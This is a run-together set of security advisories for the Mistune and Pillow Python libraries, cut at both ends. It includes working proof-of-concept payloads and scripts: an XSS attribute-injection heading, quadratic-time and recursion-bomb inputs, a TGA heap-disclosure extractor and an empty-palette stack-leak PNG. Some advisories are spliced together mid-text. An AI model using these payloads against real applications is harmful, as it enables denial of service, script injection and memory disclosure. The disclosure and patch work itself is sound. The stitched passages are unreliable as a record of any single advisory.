renderer, which is why `text` arrives as `"` etc. But `_id` arrives as a raw string directly from whatever the `heading_id` callback returned — no escaping occurs at any point in the pipeline. ## PoC **Step 1 — Establish the baseline (safe default IDs)** The script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom `heading_id` callback). The default hook generates sequential numeric IDs: ```python md_safe = create_markdown(escape=True) add_toc_hook(md_safe) # default: heading_id produces toc_1, toc_2, … bl_src = "## Introduction " bl_out, _ = md_safe.parse(bl_src) ``` Output — ID is auto-generated, no user text appears in it: ```html

Introduction

``` **Step 2 — Add the realistic trigger: a text-based `heading_id` callback** Deriving an anchor ID from the heading text is the standard real-world pattern (slugifiers, `mkdocs`, `sphinx`, `jekyll` all do this). The PoC uses the simplest possible version — return the raw heading text unchanged — to show the vulnerability without any extra transformation: ```python def raw_id(token, index): return token.get("text", "") # returns raw heading text as the ID md_vuln = create_markdown(escape=True) add_toc_hook(md_vuln, heading_id=raw_id) ``` **Step 3 — Craft the exploit payload** Construct a heading whose text contains a double-quote followed by an injected attribute: ``` ## foo" onmouseover="alert(document.cookie)" x=" ``` When `raw_id` is called, `token["text"]` is `foo" onmouseover="alert(document.cookie)" x="`. This is passed verbatim to `heading()` as the `id` attribute value. **Step 4 — Observe attribute breakout in the output** ```python ex_src = '## foo" onmouseover="alert(document.cookie)" x=" ' ex_out, _ = md_vuln.parse(ex_src) ``` Actual output: ```html

``` Note: the heading **body text** is correctly escaped (`"`), but the **`id=` attribute** is not. A user who moves their mouse over the heading triggers `alert(document.cookie)`. ### Summary Mistune is vulnerable to a CPU exhaustion DoS due to superlinear (approximately O(n²)) behavior in parse_link_text. A relatively small input consisting of repeated [ characters causes significant parsing slowdown. ### Affected component mistune/inline_parser.py → **parse_link_text** ### Description When parsing Markdown containing many consecutive [ characters, parse_link_text repeatedly scans the input using a regex search inside a loop. Each iteration re-scans a large portion of the remaining string, resulting in quadratic-time behavior. An attacker-controlled Markdown input can therefore trigger excessive CPU usage with a very small payload. ### Root cause The vulnerability stems from a two-loop interaction: - The outer loop in `InlineParser.parse()` (inline_parser.py) advances only 1 character at a time when parse_link() returns None - Each failed attempt calls `parse_link_text()` which performs an O(n) scan to the end of the string looking for a closing `]` - With n consecutive `[` characters, this results in O(n) × O(n) = O(n²) total work ### PoC Run below python script ``` import mistune import time md = mistune.create_markdown() s = "[" * 6400 t = time.perf_counter() md(s) print(time.perf_counter() - t) ``` **Benmark poc** Run below code for benchmark ``` import mistune import time md = mistune.create_markdown() sizes = [100,200,400,800,1600,3200,6400] for n in sizes: s = "[" * n t0 = time.perf_counter() md(s) dt = time.perf_counter() - t0 print(f"{n:6d} {dt:.6f}") ``` ### Observed behaviour ``` python3 benchmark.py 100 0.001609 200 0.003207 400 0.012906 800 0.050220 1600 0.197307 3200 0.801172 6400 3.190393 ``` Execution time grows superlinearly, consistent with O(n²) complex ### Impact This can be used as a denial-of-service attack in any application that parses user-supplied Markdown using Mistune, including: - Web applications (comments, posts, content rendering) - API services processing Markdown - Documentation rendering systems - A small (~6 KB) payload can block CPU for multiple seconds. ### Suggested fix Return the furthest scanned position from parse_link_text even on failure, so the outer loop can skip ahead instead of advancing 1 character at a time ### Security Classification CWE-400: Uncontrolled Resource Consumption Denial of Service (CPU exhaustion)

### Summary Pillow's documented PDF append path can spend disproportionate CPU time on a compact malformed PDF page tree.  An attacker who can supply an existing PDF to an application that appends an image with `Image.save(..., format="PDF", append=True)` can provide a malformed `/Pages` tree where each level repeats the same child `/Pages` reference in `/Kids`. Pillow treats the graph as a tree and expands each repeated reference in `PdfParser.linearize_page_tree()` without tracking visited or duplicate indirect references.  In the bounded proof below, a `1410`-byte PDF expands to `8192` page references from one distinct page object and takes about `9.6` seconds through the append path. A comparable linear control with the same depth stays at one page reference and completes in about `0.02` seconds.  This is in scope for Pillow's security policy because it is reproducible in `main`, affects the latest public release tested (`12.3.0`), and is not just an unexpected Python exception. The vulnerable operation accepts attacker-controlled PDF bytes through Pillow's PDF parser and causes deterministic resource consumption before normal completion.  ### Details  #### Affected versions  - Package: `Pillow` - Ecosystem: `pip` / PyPI - Affected component: `src/PIL/PdfParser.py` page-tree traversal reached from `src/PIL/PdfImagePlugin.py` PDF append handling - Runtime-tested affected release: `12.3.0` - Runtime-tested affected development version: `13.0.0.dev0` - Tested commit: `b39b9649312fbc381060e8c7c7f9f0de4cc63daa` - Current source artifact hash: `sha256(git archive --format=tar HEAD) = 2ccefca23d432456765be8d3c34564c65ba016b0c9da1e44ca389762f7eda054` - Release `12.3.0` commit: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d` - Release `12.3.0` source artifact hash: `sha256(git archive --format=tar 12.3.0) = 94bed33fd20123938dbc0153d295250bb4e3c09251b6d4a34f7595e25d409c81` - Source-level affected: `5.1.0`, `12.2.0`, `12.3.0`, and `HEAD` - Likely affected range: `>= 5.1.0` - Patched versions: none known  Evidence fact strings:  - Runtime-tested affected: 12.3.0 - Runtime-tested affected: 13.0.0.dev0 at b39b9649312fbc381060e8c7c7f9f0de4cc63daa - Source-level affected: 5.1.0 - Source-level affected: 12.2.0 - Source-level affected: HEAD - Likely affected range: >= 5.1.0, no fixed version known - Pre-boundary note: 5.0.0 has PdfImagePlugin.py but no src/PIL/PdfParser.py  `5.0.0` contains `src/PIL/PdfImagePlugin.py` but does not contain `src/PIL/PdfParser.py`. `PdfParser.py` was introduced by `6207b44ab1ff4a91d8ddc7579619876d0bb191a4` (`2018-01-18 issue #2959: support appending to existing PDFs`), which shipped in `5.1.0`.  #### Technical details  The reachable path is:  1. A service or application receives an attacker-influenced existing PDF and appends an image using Pillow's public PDF save path:     ```python    Image.new("L", (1, 1), 0).save(existing_pdf_file, format="PDF", append=True)    ```  2. `src/PIL/PdfImagePlugin.py` routes `append=True` to `PdfParser`:     ```python    is_appending = im.encoderinfo.get("append", False)    filename_str = filename.decode() if isinstance(filename, bytes) else filename    if is_appending:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="r+b")    else:        existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode="w+b")    ```  3. `src/PIL/PdfParser.py` parses the existing PDF and linearizes the page tree:     ```python    self.page_tree_root = self.read_indirect(self.pages_ref)    self.pages = self.linearize_page_tree(self.page_tree_root)    self.orig_pages = self.pages[:]    ```  4. `linearize_page_tree()` recursively follows every `/Kids` entry and extends the page list. It does not track page-tree node identity, duplicate references, or active traversal references:     ```python    def linearize_page_tree(        self, node: PdfDict | None = None    ) -> list[IndirectReference]:        page_node = node if node is not None else self.page_tree_root        check_format_condition(            page_node[b"Type"] == b"Pages", "/Type of page tree node is not /Pages"        )        pages = []        for kid in page_node[b"Kids"]:            kid_object = self.read_indirect(kid)            if kid_object[b"Type"] == b"Page":                pages.append(kid)            else:                pages.extend(self.linearize_page_tree(node=kid_object))        return pages    ```  5. During append, `rewrite_pages()` then iterates the expanded `orig_pages` list and scans/replaces entries in `self.pages`, adding more cost to the already expanded duplicate-reference list.  The missing invariant is:  ```text The PDF page tree should be treated as an acyclic tree of unique indirect references before Pillow builds pages/orig_pages or rewrites pages. ```  The proof intentionally uses a malformed PDF page-tree DAG: each `/Pages` node repeats the same next `/Pages` child reference twice. message: pillow 12.2.0: CVE-2026-59198 — Pillow TGA RLE encoder can serialize up to ~57 KB of adjacent heap data into generated images
description:
### Summary

Pillow's TGA RLE encoder reads past its row buffer when saving a mode `"1"`
image. Adjacent process heap bytes can be copied into the generated TGA file.

The bug is reachable through the public save API:

```python
im.save(out, format="TGA", compression="tga_rle")
```

Older affected Pillow versions use the equivalent public option `rle=True`.

For mode `"1"`, Pillow allocates a packed row buffer of `ceil(width / 8)`
bytes, but `ImagingTgaRleEncode()` treats the row as one full byte per pixel.

The maximum valid TGA width is `65535`. At that width:

```text
allocated packed row buffer: 8192 bytes
encoder byte-offset walk:     65535 bytes
maximum OOB window per row:   57343 bytes
```

On non-ASAN Pillow `12.2.0`, the public-only maximum-width PoC below serialized
`57297` bytes from distinct out-of-bounds source offsets into one returned TGA,
covering `99.92%` of the maximum adjacent heap window. No heap grooming, ctypes,
private API, or malformed input file was used. The disclosure is emitted across
many TGA packet payload copies of at most `128` bytes each, not one large
`memcpy()`.

### Details

`src/PIL/TgaImagePlugin.py` allows mode `"1"` TGA output and selects the
`tga_rle` encoder when RLE compression is requested.

`src/encode.c:_setimage()` allocates the row buffer using the packed-bit
formula:

```c
state->bytes = (state->bits * state->xsize + 7) / 8;
state->buffer = (UINT8 *)calloc(1, state->bytes);
```

For mode `"1"`, `state->bits == 1`.

`src/libImaging/TgaRleEncode.c` then computes:

```c
bytesPerPixel = (state->bits + 7) / 8;
```

This becomes `1`, and the encoder uses pixel indexes as byte offsets:

```c
static int
comparePixels(const UINT8 *buf, int x, int bytesPerPixel) {
    buf += x * bytesPerPixel;
    return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0;
}
```

The packet payload `memcpy()` later copies those out-of-bounds source bytes into
the output. Raw packets copy up to `128` contiguous bytes, while RLE packets copy
one representative byte:

```c
memcpy(
    dst, state->buffer + (state->x * bytesPerPixel - state->count), flushCount
);
```

A width-2 mode `"1"` image allocates one row byte and already triggers an ASAN
heap-buffer-overflow read. Wider images increase the adjacent heap window and
the amount of heap data that can be serialized.

### PoC

#### Minimal ASAN trigger

```python
import io
from PIL import Image

out = io.BytesIO()
Image.new("1", (2, 1)).save(out, format="TGA", compression="tga_rle")
```

Observed on local Pillow `12.3.0.dev0` ASAN target:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
comparePixels /out/src/src/libImaging/TgaRleEncode.c:10
ImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81
0 bytes after a 1-byte allocation from _setimage
```

#### Maximum-width heap disclosure

This PoC uses one maximum-width row. It parses the generated TGA packets and
extracts only payload bytes whose source offsets were outside the allocated
packed row. Rows are  avoided because they mostly repeat the same adjacent heap window.

Run the following with a standard affected Pillow installation.

```python
import hashlib
import io
import PIL
from PIL import Image

WIDTH = 65535
ATTEMPTS = 20
ROW_BYTES = (WIDTH + 7) // 8
MAX_OOB_WINDOW = WIDTH - ROW_BYTES

def extract_oob_payload(data):
    i = 18
    pixel = 0
    oob = bytearray()

    while pixel < WIDTH:
        descriptor = data[i]
        i += 1
        count = (descriptor & 0x7F) + 1

        if descriptor & 0x80:
            value = data[i]
            i += 1
            if pixel + count - 1 >= ROW_BYTES:
                oob.append(value)
        else:
            values = data[i : i + count]
            i += count
            oob.extend(values[max(ROW_BYTES - pixel, 0) :])

        pixel += count

    return bytes(oob)


best = b""

for _ in range(ATTEMPTS):
    out = io.BytesIO()
    Image.new("1", (WIDTH, 1), 0).save(out, format="TGA", compression="tga_rle")
    oob = extract_oob_payload(out.getvalue())
    if len(oob) > len(best):
        best = oob

with open("/tmp/max_oob_bytes.bin", "wb") as fp:
    fp.write(best)

print(f"Pillow={PIL.__version__}")
print(f"packed_row_bytes={ROW_BYTES}")
print(f"maximum_oob_window={MAX_OOB_WINDOW}")
print(f"serialized_distinct_oob_offsets={len(best)}")
print(f"nonzero_oob_bytes={sum(byte != 0 for byte in best)}")
print(f"coverage={len(best) / MAX_OOB_WINDOW:.2%}")
print(f"sha256={hashlib.sha256(best).hexdigest()}")
```

Observed on installed Pillow `12.2.0`:

```text
Pillow=12.2.0
packed_row_bytes=8192
maximum_oob_window=57343
serialized_distinct_oob_offsets=57297
nonzero_oob_bytes=54407
coverage=99.92%
```

### Impact

This is a heap out-of-bounds read and potential information disclosure.

A maximum-width single-row image can cause nearly the full
`57343`-byte adjacent heap window to be incorporated into one output file.

A 2 MB file takes about 5 seconds to open, a 4 MB file about 35 seconds, and an 8 MB file about 3 minutes. An ordinary GIF of the same size opens in well under a second. The cost is paid inside `Image.open()` itself, with default settings, before the application has seen the image's size or format. The bug is in `GifImageFile._seek()` in `src/PIL/GifImagePlugin.py`, which builds `info["comment"]` by appending to an immutable `bytes` object with no size limit. It appends once per 255-byte sub-block (`comment += block`, line 261) and once per comment extension (`info["comment"] += b"\n" + comment`, line 266). Each append copies everything collected so far. A file made of many tiny comment extensions forces a full re-copy for each one. Because `_open()` ends with `self._seek(0)`, any code that only opens an uploaded file to identify it, read its dimensions, or make a thumbnail pays the full cost. The decompression-bomb check does not help, since the image is 1×1. Memory use stays linear, so the effect is processor exhaustion and latency, bounded by whatever upload size the service allows (about 1 second at 1 MB). This is the same kind of issue as the EPS open-phase slowdown fixed as CVE-2021-28677, here in the GIF comment handling. The 4 MB comment file took about 34 seconds to open, against 0.26 seconds for its control. A patch that collects the pieces in a list and joins them once is also attached. ## Details `GifImageFile._seek()` collects GIF comment extensions into `info["comment"]` using `bytes` concatenation, once per 255-byte sub-block and once per comment extension, with no limit on the total. `bytes` is immutable, so every `+=` allocates a new object and copies everything accumulated so far; the work done by `Image.open()` is therefore quadratic in the amount of comment data in frame 0. A 1×1 GIF89a whose body is nothing but the 5-byte comment extension `21 FE 01 41 00` repeated makes this directly observable. `Image.open(BytesIO(data))` on such a file, stock build at this commit, 2-CPU machine: | file size | comment extensions (`21 FE …`) | same bytes labelled plain-text extension (`21 01 …`) | |---|---|---| | 1 MB | 1.2 s | 0.09 s | | 2 MB | 4.9 s | 0.13 s | | 4 MB | 35 s | 0.26 s | | 8 MB | 183 s | — | The control column is the identical byte stream with the extension label changed from `0xFE` to `0x01`; it goes through the same loop and the same `self.data()` reads but is discarded instead of concatenated, and scales linearly. message: pillow 12.2.0: CVE-2026-96638 — Pillow: BMP RLE decoder memory-amplification DoS via unbounded delta escape / absolute mode
description:
## Summary
BmpRleDecoder can be forced to allocate gigabytes of memory from a kilobyte-sized crafted BMP file via unbounded growth in the delta escape and absolute mode branches.

## Affected versions
All versions up to and including current HEAD (v13.0.0.dev0, commit e7a7ea84)

## Root cause
BmpRleDecoder.decode() (BmpImagePlugin.py:327-395) builds a Python bytearray `data` with dest_length = xsize*ysize, looping `while len(data) < dest_length`. The loop condition is only checked at the TOP; individual branches append attacker-controlled amounts UNBOUNDED by dest_length:

- delta escape (line 370): data += b"\x00" * (right + up * self.state.xsize) with right,up in 0..255 -> up to ~255*xsize bytes in ONE iteration.
- absolute mode (line 385): data += bytes_read (up to 255).

Because a single delta can push len(data) to ~256 * (row size), a tiny RLE stream combined with a large-but-legal xsize (xsize*ysize just under MAX_IMAGE_PIXELS, ~89M) yields a multi-GB `data` bytearray (then copied again by bytes(data) and set_as_raw). No heap OOB (bytearray/set_as_raw are bounds-safe), but a severe memory-amplification DoS: the attacker file stays tiny.

## Reproduction
Python 3.13, Pillow HEAD e7a7ea84

Attached: pillow_poc_bmp_rle_dos.py

A 1084-byte BMP (BI_RLE8, width=3,000,000, height=1 -> 3M px, passes bomb check) with one delta escape (00 02 00 150) produces ~429 MB `data`; measured peak RSS 911 MB. Scaling width toward the bomb limit and up=255 produces tens of GB from a ~1 KB file.

## Suggested fix
Cap growth at dest_length in the delta and absolute branches, e.g. clamp the delta fill to (dest_length - len(data)) and stop appending once len(data) >= dest_length; reject deltas that would move the cursor beyond the image, matching the existing per-row clamp at line 341-343.

Credit: Yazan Balawneh - CyStack Security Team (GitHub: sonicnew)

message: pillow 12.2.0: CVE-2026-112391 — Pillow: PdfParser can recurse without limit in get_value() and linearize_page_tree()
description:
### Summary
`PdfParser`'s `get_value()` can recurse without any limit and crash with an uncaught `RecursionError`. It is reachable through `Image.save(im, fp=<pdf>, format="PDF", append=True)` when the existing PDF file is attacker-controlled. This is the same class of bug as https://github.com/advisories/GHSA-r73j-pqj5-w3x7 (the /Prev trailer chain loop, fixed earlier this year), in the same file, but in two different functions that fix did not touch.

### Details
**`get_value()` in `src/PIL/PdfParser.py`**

This is a classmethod that takes `max_nesting: int = -1` and has a guard:

```python
if max_nesting == 0:
    return None, None
```

Every recursive call (nested arrays, dictionaries, indirect object definitions) passes `max_nesting=max_nesting - 1`. Since the default and every call site start at -1, this only ever counts down further negative: -1, -2, -3, and so on. It never equals exactly 0, so the guard never runs. A PDF object with a value nested a few thousand levels deep is enough to hit Python's recursion limit. It does not even need a valid `/Pages` tree, since `read_pdf_info()` parses the `/Root` object's own dictionary first, before checking anything else.

This advisory reports a single vulnerability: an ineffective recursion-depth guard in `PdfParser.get_value()` (the sentinel  `-1`  default never reaches the `== 0` check). The mention of GHSA-r73j-pqj5-w3x7 is comparative context for an already-fixed, already-CVE'd bug in a different function — it is not a second vulnerability being reported. The three trigger paths (nested arrays/dicts/indirect objects) are not independently fixable; they share one root cause and one fix location in  get_value() .

### Steps to reproduce
Both PDFs below are plain text, built directly in Python, no PDF library needed.

```python
from PIL.PdfParser import PdfParser

def build_pdf(root):
    out = bytearray(b"%PDF-1.4\n")
    offset = len(out)
    out += f"1 0 obj\n".encode()
    out += root
    out += b"\nendobj\n"
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    out += b"trailer\n"
    out += f"<< /Size 2 /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"
    return bytes(out)

bomb = b"[" * 3000 + b"]" * 3000
root = b"<< /Type /Catalog /Pages 2 0 R /Bomb " + bomb + b" >>"
with open("nesting_bomb.pdf", "wb") as f:
    f.write(build_pdf(root))

PdfParser("nesting_bomb.pdf")     # raises RecursionError
```

Expected: a clean `PdfFormatError`.

Actual: raises a raw `RecursionError: maximum recursion depth exceeded`.

### Impact
- Availability: an attacker who controls the content of a PDF file that an application later appends an image page to (`Image.save(..., format="PDF", append=True)`) can crash that request with a RecursionError, using a file of a few hundred bytes.
- Confidentiality: none.
- Integrity: none.
- Pillow cannot open PDFs for reading through `Image.open()`. `PdfParser` is only reached through the append-mode save path, so the app has to be doing that specific thing (for example, stamping or watermarking an existing PDF) for this to matter.

message: pillow 12.2.0: CVE-2026-112898 — Pillow: Image.quantize() with empty palette leaks uninitialized stack memory
description:
``` ============================================================================ Image.quantize() with empty palette leaks uninitialized stack memory Location: src/libImaging/Palette.c:216 in ImagingPaletteCacheUpdate() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application lets a user supply the palette image for Pillow's `Image.quantize(palette=...)`, the user can get back 512 bytes of the server process's stack memory in the pixels of the returned image. An 80-byte PNG with an empty palette is enough, and the leaked bytes survive saving to PNG or GIF. In the runs examined, those bytes included memory addresses inside the stack, heap, libc, libpython and Pillow's own C module, along with the stack-protector canary. The bug is in `ImagingPaletteCacheUpdate()` in `src/libImaging/Palette.c`. It fills a local `UINT8 c[512]` only inside loops bounded by `palette->size`. When the palette has zero entries, the array is never written, but it is still copied into the colour cache. `topalette()` in `src/libImaging/Convert.c` then emits the cached values as output pixel indices. `topalette()` rejects a `NULL` palette but not one with `size == 0`. Three inputs produce such a zero-entry `"P"` image: a PNG with a zero-length `PLTE` chunk opened with `Image.open()`, a colour-mapped TGA with colour-map length 0, or a bare `Image.new("P", ...)`. The attacker must control the *palette* image; the source image can be anything, and `RGB` sources are affected with either dither mode. There is no out-of-bounds access and no memory corruption. The consequence is a bounded stack disclosure that can reveal address layout and the canary of a long-lived worker, with no crash and no log entry. The attached reproducer quantizes a 512-colour strip against the empty-palette PNG and finds 8 of the 64 output words pointing into the process's own `[stack]` mapping, while a one-entry palette control yields all zeros. The behaviour was introduced in commit `54cb09d8b48c` (first released in 9.1.0). The `Image.new("P", ...)` route exists since 10.1.0. ## Details `ImagingPaletteCacheUpdate()` (`src/libImaging/Palette.c:154`) computes, for one 8×8×8 box of the colour cache, the nearest palette index for each of the 512 slots into a local `UINT8 c[512]` and then copies `c[]` into the cache. `c[]` is only ever written inside `for (i = 0; i < palette->size; i++)`. When the palette has zero entries nothing writes it, the untouched stack bytes are copied into the cache, and `topalette()` (`src/libImaging/Convert.c:1145`) emits them as the output pixels of `Image.quantize(palette=...)`. The root cause is that `topalette()` only rejects a `NULL` palette, never one with `palette->size == 0`, while `ImagingPaletteCacheUpdate()` silently assumes `size >= 1`. A zero-entry `"P"` image is what `Image.open()` produces for a PNG whose `PLTE` chunk has length 0 (or a colour-mapped TGA with colour-map length 0); `Image.new("P", size)` without a subsequent `putpalette()` yields one as well. Both dither modes (`Dither.NONE` and the default Floyd-Steinberg) are affected for `RGB` sources (an `L` source takes the grayscale copy path and never consults the cache). Showing it with the installed build, no special flags. The 80-byte PNG below is 4×4, bit depth 8, colour type 3, with a zero-length `PLTE` and an all-zero `IDAT`: ``` 89504e470d0a1a0a 0000000d49484452 0000000400000004 0803000000 9e2f6e4c 00000000 504c5445 4ba88955 0000000b 49444154 789c6360c0040000140001 7dfe1eee 00000000 49454e44 ae426082 ``` ```python pal = Image.open(io.BytesIO(png)); pal.load() # pal.mode == "P", pal.im.getpalette("RGB") == b"" src = Image.new("RGB", (512, 1)) src.putdata([(r*4, g*4, b*4) for r in range(8) for g in range(8) for b in range(8)]) out = src.quantize(palette=pal, dither=Image.Dither.NONE) out.tobytes() # 512 bytes, different in every process ``` The 512 source colours are chosen so that each pixel lands in a distinct slot of the cache box for `r,g,b ∈ [0,32)`, in slot order, so `out.tobytes()` is exactly `c[0..511]`. Read as 64 little-endian 8-byte words and resolved against the same process's `/proc/self/maps`, a typical run gives 43 words that are addresses inside the process's own mappings — 8 in `[stack]`, several in `[heap]`, `libc.so.6`, `libpython3.12.so` and `_imaging.cpython-312-x86_64-linux-gnu.so` — and 3 words equal to the thread's stack-protector canary (read from `fs:0x28` for comparison). The same PNG with a 3-byte `PLTE` (one entry) gives 512 zero bytes in every run. `out.save(buf, "PNG")` succeeds, so the bytes leave the process in an ordinary image. Under valgrind (run against a `strip --strip-debug` copy of `_imaging.so` or a gcc build, since valgrind 3.19 cannot read clang's DWARF5) the report carries the origin `Uninitialised value was created by a stack allocation at ImagingPaletteCacheUpdate`. With `Dither.NONE` `topalette` only copies the bytes, so the first `use of uninitialised value` is flagged where Python first branches on the pixel data; with the default Floyd-Steinberg dither it is flagged inside `topalette` (inlined into `ImagingConvert`), where the cached index is used to address `palette->palette`. ### Code path File → empty C palette. `PngImagePlugin.chunk_PLTE` (`src/PIL/PngImagePlugin.py:499-505`) stores the chunk payload whatever its length, `_open` wraps it as `ImagePalette.raw("RGB", b"")` (`:836-838`), and `Image.load()` realises it with `self.im.putpalette("RGB", "RGB", b"")` (`src/PIL/Image.py:989-990`). `_putpalette` (`src/_imaging.c:1850-1868`) rejects only more than 256 entries and sets `palette->size = palettesize * 8 / bits`, i.e. 0. `TgaImagePlugin._open` (`src/PIL/TgaImagePlugin.py:121-135`) builds the same empty palette from a colour-mapped TGA whose colour-map-length field is 0. API → sink. `Image.quantize(palette=pal)` (`src/PIL/Image.py:1329-1338`) checks only `palette.mode == "P"` and calls `self.im.convert("P", dither, palette.im)` → `ImagingConvert` → `topalette(..., inpalette=, dither)`. `topalette` tests the palette for `NULL` (`Convert.c:1162`, `:1178`) but not for `size == 0`, allocates the cache (every slot `0x100` = "not computed"), and for each source pixel: ```c // src/libImaging/Convert.c:1319-1327 (non-dither path; the dither path at 1252-1265 is the same) cache = &ImagingPaletteCache(palette, r, g, b); if (cache[0] == 0x100) { ImagingPaletteCacheUpdate(palette, r, g, b); } … out[x] = (UINT8)cache[0]; ``` Inside `ImagingPaletteCacheUpdate` the only store to `c[]` is in step 2, and both step 1 and step 2 iterate over palette entries: ```c // src/libImaging/Palette.c:160-161 unsigned int d[BOXVOLUME]; UINT8 c[BOXVOLUME]; … // src/libImaging/Palette.c:212-221, 240-242 for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; /* d[] is initialised, c[] is not */ } for (i = 0; i < palette->size; i++) { /* size == 0: body never runs */ if (dmin[i] <= dmax) { … if ((unsigned int)bd < d[j]) { d[j] = bd; c[j] = (UINT8)i; } ``` For any non-empty palette every slot is written: the entry that produced `dmax` passes `dmin[i] <= dmax`, and because `d[j]` starts at `~0` the first visiting entry always stores into `c[j]`. With `size == 0` the loop is skipped entirely and step 3 publishes the raw stack array: ```c // src/libImaging/Palette.c:262-266 j = 0; for (r = r0; r < r1; r += 4) { for (g = g0; g < g1; g += 4) { for (b = b0; b < b1; b += 4) { ImagingPaletteCache(palette, r, g, b) = c[j++]; ``` `cache[0]` is then ≤ 255 and `palette->palette` is a fixed 1024-byte array, so the subsequent `palette->palette[cache[0] * 4]` reads in the dither path stay in bounds; the defect is purely that stack contents become pixel values. Because no deeper call happens between successive `ImagingPaletteCacheUpdate` invocations in the pixel loop, every box yields the same 512 bytes — whatever earlier, deeper call chains (the PNG decode, the interpreter) left at that stack depth. The behaviour was introduced in `54cb09d8b48c` ("When converting to P, restrict colors to palette size", 2022-02-16), first released in 9.1.0; before it, the cache update iterated over all 256 palette slots. The `Image.new("P", ...)` route additionally depends on `fd310512b95a` ("Set C palette to be empty by default", first in 10.1.0); before that a fresh `"P"` image carried a 256-entry grey ramp. ## Impact An application that lets a user supply the reference palette image for `Image.quantize(palette=...)` — palette-swap / "apply this palette" features, sprite and GIF tooling, pixel-art converters — and returns the quantised result hands that user 512 bytes of the worker's C stack, encoded as pixel indices (directly readable from the saved PNG/GIF, since index values survive losslessly). In the build examined those bytes contain return addresses and frame pointers into the stack, heap, libc, libpython and `_imaging.so`, plus the stack-protector canary: an ASLR and canary disclosure from a long-lived server process, obtained with an 80-byte upload, no crash and no log entry. The precondition is that the attacker controls the *palette* image (the source image can be anything with at least one colour per cache box of interest); when the palette image is application-owned the path is not reachable. There is no out-of-bounds access and no memory corruption. ## Reproducing `repro` is a short, single-file Python script that runs against the installed Pillow. It doesn't rebuild anything or start any other process, and it finishes in about 0.1 s. 1. `png_with_plte()` builds a 4×4 palette-mode PNG (bit depth 8, colour type 3) around a given `PLTE` payload. With an empty payload it produces exactly the 80-byte file shown above. 2. `quantize_against()` does what an "apply this palette" feature does: it opens the PNG with `Image.open()` and calls `quantize(palette=pal, dither=Image.Dither.NONE)` on a 512×1 RGB strip. The strip holds the colours `(r*4, g*4, b*4)` for `r, g, b` in `0..7`, one for each slot of the colour-cache box `r, g, b ∈ [0,32)` and in slot order. That makes output pixel `j` exactly `c[j]` of `ImagingPaletteCacheUpdate()`. 3. **Control:** a one-entry `PLTE`. The only valid index is 0, and every output pixel is 0. 4. **Attack:** the same PNG with a zero-length `PLTE`. `quantize()` returns an image without complaint, and its pixels contain about 80 distinct values. 5. **Check:** the script reads the 512 output bytes as 64 little-endian 8-byte words and compares them with the `[stack]` range in the script's own `/proc/self/maps`. It prints each word that points into the stack. A typical run finds 8, e.g. `pixels 0..7 = 0x00007ffd959c3fa0 <- pointer into [stack]`. Pixel data can only hold stack addresses if it was copied from the stack. The script prints `BUG` if the control is all zeros and at least two output words are stack addresses. It prints `OK` if `quantize()` rejects the empty palette with `ValueError`, which is what the attached patch does, or if the output has no stack pointers. The script was also checked against an out-of-tree rebuild, which is not part of the script. With the attached patch it prints `attack (empty PLTE): rejected: empty palette` / `OK`. With only the `Palette.c` half of the patch, the output is 512 zero bytes and it prints `OK`. ## Suggested fix The attached patch rejects an empty palette in `topalette()` before any work is done, with `ValueError("empty palette")` in the same idiom as the neighbouring "no palette" / "conversion not supported" checks, so `Image.quantize()` raises a normal `ValueError`. It also zero-fills `c[]` alongside `d[]` in `ImagingPaletteCacheUpdate()` so no present or future caller can copy stack contents into the cache, and adds a regression test `test_empty_palette` to `Tests/test_image_quantize.py`. `quantize(palette=)` is the only path that hands a caller-supplied palette to `topalette()`; the `NULL`-palette branches always build 256- or 226-entry palettes and are unaffected. The one behaviour change is that quantizing against an empty palette (including a bare `Image.new("P", ...)`) now raises instead of returning garbage indices. The C changes: ```diff --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` Applied to a clean copy of the tree and rebuilt, the reproducer's attack step fails with `ValueError: empty palette` and the script prints `OK`; the one-entry control is unchanged. Apart from the regression test, the patch does not touch the Python code in `src/PIL`. Optionally `PngImagePlugin.chunk_PLTE` could additionally raise `SyntaxError` for a `PLTE` whose length is 0 or not a multiple of 3, as the PNG specification requires 1–256 entries, and `Image.quantize()` could raise a clearer Python-level error when `palette.palette` is empty. ## The patch Raise ValueError in topalette() for a palette with no entries and zero-initialise the cache slot array in ImagingPaletteCacheUpdate() Applies to `src/libImaging/Convert.c` at the commit above. ```diff diff --git a/Tests/test_image_quantize.py b/Tests/test_image_quantize.py index 887628560..dcd1d901e 100644 --- a/Tests/test_image_quantize.py +++ b/Tests/test_image_quantize.py @@ -179,3 +179,13 @@ def test_small_palette() -> None: quantized_colors = im.getcolors() assert quantized_colors is not None assert len(quantized_colors) == 2 + + +def test_empty_palette() -> None: + im = hopper() + + p = Image.new("P", (1, 1)) + p.putpalette(b"") + + with pytest.raises(ValueError): + im.quantize(palette=p) diff --git a/src/libImaging/Convert.c b/src/libImaging/Convert.c index 4a35a9a1f..7746d9255 100644 --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == 